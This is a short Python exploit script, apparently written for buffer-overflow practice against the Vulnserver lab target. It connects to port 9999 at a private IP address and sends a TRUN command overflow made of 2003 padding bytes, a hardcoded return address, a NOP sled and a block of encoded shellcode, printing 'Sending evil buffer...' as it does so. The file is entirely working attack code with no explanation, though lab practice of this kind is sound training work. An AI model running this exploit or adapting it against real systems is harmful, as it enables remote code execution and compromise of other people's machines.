#!/usr/bin/env python3


import socket


ip = "192.168.203.166"
port = 9999

prefix = "TRUN /.:/"
offset = "A" * 2003
retn = "\xaf\x11\x50\x62" # 625011AF
padding = "\x90" * 16
payload = (
"\xdb\xc5\xb8\x38\x2f\xea\x52\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\xd3\xd3\x08\xa7\xdf\xc4\x4f"
"\x48\x1f\x15\x30\xc0\xfa\x24\x70\xb6\x8f\x17\x40\xbc\xdd\x9b"
"\x2b\x90\xf5\x28\x59\x3d\xfa\x99\xd4\x1b\x35\x19\x44\x5f\x54"
"\x99\x97\x8c\xb6\xa0\x57\xc1\xb7\xe5\x8a\x28\xe5\xbe\xc1\x9f"
"\x19\xca\x9c\x23\x92\x80\x31\x24\x47\x50\x33\x05\xd6\xea\x6a"
"\x85\xd9\x3f\x07\x8c\xc1\x5c\x22\x46\x7a\x96\xd8\x59\xaa\xe6"
"\x21\xf5\x93\xc6\xd3\x07\xd4\xe1\x0b\x72\x2c\x12\xb1\x85\xeb"
"\x68\x6d\x03\xef\xcb\xe6\xb3\xcb\xea\x2b\x25\x98\xe1\x80\x21"
"\xc6\xe5\x17\xe5\x7d\x11\x93\x08\x51\x93\xe7\x2e\x75\xff\xbc"
"\x4f\x2c\xa5\x13\x6f\x2e\x06\xcb\xd5\x25\xab\x18\x64\x64\xa4"
"\xed\x45\x96\x34\x7a\xdd\xe5\x06\x25\x75\x61\x2b\xae\x53\x76"
"\x4c\x85\x24\xe8\xb3\x26\x55\x21\x70\x72\x05\x59\x51\xfb\xce"
"\x99\x5e\x2e\x40\xc9\xf0\x81\x21\xb9\xb0\x71\xca\xd3\x3e\xad"
"\xea\xdc\x94\xc6\x81\x27\x7f\x29\xfd\xec\xcb\xc1\xfc\xf2\x22"
"\x4e\x88\x14\x2e\x7e\xdc\x8f\xc7\xe7\x45\x5b\x79\xe7\x53\x26"
"\xb9\x63\x50\xd7\x74\x84\x1d\xcb\xe1\x64\x68\xb1\xa4\x7b\x46"
"\xdd\x2b\xe9\x0d\x1d\x25\x12\x9a\x4a\x62\xe4\xd3\x1e\x9e\x5f"
"\x4a\x3c\x63\x39\xb5\x84\xb8\xfa\x38\x05\x4c\x46\x1f\x15\x88"
"\x47\x1b\x41\x44\x1e\xf5\x3f\x22\xc8\xb7\xe9\xfc\xa7\x11\x7d"
"\x78\x84\xa1\xfb\x85\xc1\x57\xe3\x34\xbc\x21\x1c\xf8\x28\xa6"
"\x65\xe4\xc8\x49\xbc\xac\xe9\xab\x14\xd9\x81\x75\xfd\x60\xcc"
"\x85\x28\xa6\xe9\x05\xd8\x57\x0e\x15\xa9\x52\x4a\x91\x42\x2f"
"\xc3\x74\x64\x9c\xe4\x5c"
)

postfix = ""

buffer = prefix + offset + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer, "latin-1"))
  print("Done!")
except:
  print("Could not connect.")